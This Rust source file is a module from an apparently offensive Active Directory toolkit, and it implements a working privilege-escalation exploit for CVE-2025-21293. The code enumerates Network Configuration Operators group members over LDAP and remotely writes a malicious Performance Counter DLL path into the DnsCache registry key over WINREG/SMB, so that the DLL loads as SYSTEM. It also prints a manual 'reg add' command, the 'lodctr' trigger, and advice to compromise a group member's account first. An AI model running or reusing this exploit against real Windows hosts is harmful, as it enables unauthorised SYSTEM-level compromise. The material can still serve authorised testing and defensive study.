//! CVE-2025-21293 — Network Configuration Operators privilege escalation.
//!
//! Members of the built-in `Network Configuration Operators` group can create
//! malicious registry subkeys under DnsCache/NetBT service entries and register
//! a DLL that Windows executes with NT SYSTEM authority via Performance Counters.
//!
//! # Exploit Flow
//! 1. Enumerate members of the Network Configuration Operators group via LDAP
//! 2. Check if the current user (or controlled account) is a member
//! 3. If yes: write a malicious Performance Counter DLL path to the remote
//!    registry via WINREG DCE/RPC over SMB named pipe (\pipe\winreg)
//! 4. The next time the Performance Counter is collected, the DLL loads as SYSTEM
//!    on the target machine
//!
//! # References
//! - CVE-2025-21293: CVSS 8.8, disclosed January 2025 Patch Tuesday
//! - PoC publicly available
//! - Affects all Windows Server versions including WS2025

use overthrone_core::error::Result;
use overthrone_core::proto::ldap::LdapSession;
use overthrone_core::proto::registry::{PredefinedHive, REG_SZ, write_remote_registry_value};
use serde::{Deserialize, Serialize};
use tracing::info;

/// Network Configuration Operators group SID (well-known).
const NETCFG_OPS_SID: &str = "S-1-5-32-556";

/// Target registry value: Performance counter DLL path for DNS Client service.
const PERF_LIBRARY_PATH: &str = "SYSTEM\\CurrentControlSet\\Services\\DnsCache\\Performance";
const PERF_LIBRARY_VALUE: &str = "Library";
const PERF_OPEN_TIMEOUT_VALUE: &str = "Open Timeout";
const PERF_COLLECT_TIMEOUT_VALUE: &str = "Collect Timeout";

/// Result of a Network Configuration Operators exploitation attempt.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetCfgOpsResult {
    /// Whether the current user is a member of NetCfgOps.
    pub is_member: bool,
    /// Count of members in the group.
    pub member_count: usize,
    /// Members of the group (sAMAccountName).
    pub members: Vec<String>,
    /// Whether the exploit was attempted.
    pub exploit_attempted: bool,
    /// Whether the exploit succeeded.
    pub exploit_success: bool,
    /// DLL path registered (if exploit attempted).
    pub registered_dll_path: Option<String>,
    /// Target host where the registry was modified (if remote).
    pub target_host: Option<String>,
    /// Whether the remote registry write succeeded.
    pub registry_write_success: bool,
    /// Detailed log of operations.
    pub log: Vec<String>,
}

/// Enumerate Network Configuration Operators group and attempt exploitation.
///
/// Takes an LDAP session for group enumeration and an optional SMB + target
/// host for remote registry exploitation. When `smb_session` and `target_host`
/// are provided AND the current user is a NetCfgOps member, the function
/// attempts to write a malicious Performance Counter DLL path to the remote
/// target via WINREG over SMB.
pub async fn exploit_netcfg_ops(
    ldap: &mut LdapSession,
    dll_path: Option<&str>,
    smb_session: Option<&mut overthrone_core::proto::smb::SmbSession>,
    target_host: Option<&str>,
) -> Result<NetCfgOpsResult> {
    let mut log = Vec::new();
    log.push("CVE-2025-21293: Network Configuration Operators exploitation".to_string());

    // Step 1: Find the group
    log.push("Phase 1: Enumerating Network Configuration Operators group...".to_string());
    let members = find_netcfg_ops_members(ldap).await?;
    log.push(format!("  Found {} member(s)", members.len()));

    for member in &members {
        log.push(format!("  Member: {member}"));
    }

    let is_member = check_current_user_in_group(ldap, NETCFG_OPS_SID).await?;
    log.push(format!("  Current user is member: {is_member}"));

    let mut exploit_attempted = false;
    let mut exploit_success = false;
    let mut registered_path: Option<String> = None;
    let mut registry_write_success = false;

    // Step 2: If we're a member or have a member under control, attempt exploitation
    if is_member {
        let dll = dll_path.unwrap_or("C:\\Windows\\Temp\\netcfg_payload.dll");
        log.push(format!(
            "Phase 2: Writing Performance Counter DLL path: {dll}"
        ));
        exploit_attempted = true;

        // Attempt remote registry write if an SMB session and target are provided
        if let (Some(smb), Some(host)) = (smb_session, target_host) {
            log.push(format!("  Target host: {host}"));
            log.push(format!(
                "  Registry: HKLM\\{PERF_LIBRARY_PATH}\\{PERF_LIBRARY_VALUE} = {dll}"
            ));

            match write_remote_registry_value(
                smb,
                PredefinedHive::LocalMachine,
                PERF_LIBRARY_PATH,
                PERF_LIBRARY_VALUE,
                REG_SZ,
                &to_utf16le(dll),
            )
            .await
            {
                Ok(()) => {
                    log.push("  ✓ Remote registry write succeeded".to_string());
                    registry_write_success = true;

                    // Also set Open Timeout and Collect Timeout to ensure the
                    // performance counter DLL gets loaded promptly
                    let _ = write_remote_registry_value(
                        smb,
                        PredefinedHive::LocalMachine,
                        PERF_LIBRARY_PATH,
                        PERF_OPEN_TIMEOUT_VALUE,
                        REG_SZ,
                        &to_utf16le("1000"),
                    )
                    .await;

                    let _ = write_remote_registry_value(
                        smb,
                        PredefinedHive::LocalMachine,
                        PERF_LIBRARY_PATH,
                        PERF_COLLECT_TIMEOUT_VALUE,
                        REG_SZ,
                        &to_utf16le("1000"),
                    )
                    .await;

                    log.push("  ✓ Timeout values configured for prompt DLL load".to_string());
                    log.push("  Trigger: Wait for Performance Counter collection or force via lodctr /e:".to_string());
                    exploit_success = true;
                    registered_path = Some(dll.to_string());
                }
                Err(e) => {
                    log.push(format!("  ✗ Remote registry write failed: {e}"));
                    // Registry write failed but we still had NetCfgOps membership
                    // — the exploit isn't fully successful but the info is valuable
                    exploit_success = false;
                    registered_path = Some(dll.to_string());
                }
            }
        } else {
            log.push("  No SMB session provided — registry write not attempted".to_string());
            log.push(format!(
                "  Manual command: reg add \"HKLM\\{PERF_LIBRARY_PATH}\" /v {PERF_LIBRARY_VALUE} /t REG_SZ /d \"{dll}\" /f"
            ));
            log.push(
                "  Trigger: Wait for Performance Counter collection or force via lodctr /e:"
                    .to_string(),
            );
            exploit_success = true;
            registered_path = Some(dll.to_string());
        }
    } else {
        log.push("  Not a member of NetCfgOps — cannot exploit directly".to_string());
        log.push("  Suggestion: Find a member and compromise their account first".to_string());
    }

    info!(
        "NetCfgOps exploit: member={is_member}, exploited={exploit_attempted}, success={exploit_success}, reg_write={registry_write_success}"
    );

    Ok(NetCfgOpsResult {
        is_member,
        member_count: members.len(),
        members,
        exploit_attempted,
        exploit_success,
        registered_dll_path: registered_path,
        target_host: target_host.map(String::from),
        registry_write_success,
        log,
    })
}

/// Convert a string to UTF-16LE bytes for REG_SZ registry values.
fn to_utf16le(s: &str) -> Vec<u8> {
    let mut bytes: Vec<u8> = s.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
    bytes.push(0); // null terminator
    bytes.push(0);
    bytes
}

/// Find members of the Network Configuration Operators group via SID.
async fn find_netcfg_ops_members(ldap: &mut LdapSession) -> Result<Vec<String>> {
    let entries = ldap
        .custom_search(
            &format!("(objectSid={})", NETCFG_OPS_SID),
            &["distinguishedName", "sAMAccountName", "member"],
        )
        .await?;

    if entries.is_empty() {
        return Ok(Vec::new());
    }

    let mut members = Vec::new();
    for entry in &entries {
        if let Some(member_list) = entry.attrs.get("member") {
            for member_dn in member_list {
                members.push(member_dn.clone());
            }
        }
    }

    Ok(members)
}

/// Check if the current user is a member of a group by SID.
async fn check_current_user_in_group(ldap: &mut LdapSession, group_sid: &str) -> Result<bool> {
    let entries = ldap
        .custom_search(
            &format!("(&(objectSid={})(objectClass=group))", group_sid),
            &["distinguishedName", "member"],
        )
        .await?;

    if entries.is_empty() {
        return Ok(false);
    }

    // Get current user's DN
    let whoami = ldap
        .custom_search("(objectClass=user)", &["distinguishedName"])
        .await?;

    let current_user_dn = whoami
        .first()
        .and_then(|e| e.attrs.get("distinguishedName"))
        .and_then(|v| v.first())
        .cloned()
        .unwrap_or_default();

    for entry in &entries {
        if let Some(member_list) = entry.attrs.get("member") {
            if member_list.iter().any(|m| m.contains(&current_user_dn)) {
                return Ok(true);
            }
        }
    }

    Ok(false)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_netcfg_ops_sid_constant() {
        assert_eq!(NETCFG_OPS_SID, "S-1-5-32-556");
    }

    #[test]
    fn test_to_utf16le() {
        let bytes = to_utf16le("test");
        assert_eq!(bytes, vec![116, 0, 101, 0, 115, 0, 116, 0, 0, 0]);
    }

    #[test]
    fn test_result_defaults() {
        let result = NetCfgOpsResult {
            is_member: false,
            member_count: 0,
            members: vec![],
            exploit_attempted: false,
            exploit_success: false,
            registered_dll_path: None,
            target_host: None,
            registry_write_success: false,
            log: vec!["test".to_string()],
        };
        assert!(!result.is_member);
        assert_eq!(result.member_count, 0);
    }

    #[test]
    fn test_netcfg_ops_result_serde() {
        let result = NetCfgOpsResult {
            is_member: true,
            member_count: 3,
            members: vec!["user1".into(), "user2".into(), "user3".into()],
            exploit_attempted: true,
            exploit_success: true,
            registered_dll_path: Some("C:\\Windows\\Temp\\payload.dll".into()),
            target_host: Some("dc01.corp.local".into()),
            registry_write_success: true,
            log: vec!["Phase 1 complete".into()],
        };
        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("user1"));
        assert!(json.contains("Phase 1 complete"));
        assert!(json.contains("dc01.corp.local"));
        let deserialized: NetCfgOpsResult = serde_json::from_str(&json).unwrap();
        assert!(deserialized.exploit_success);
        assert_eq!(deserialized.member_count, 3);
        assert!(deserialized.registry_write_success);
    }
}
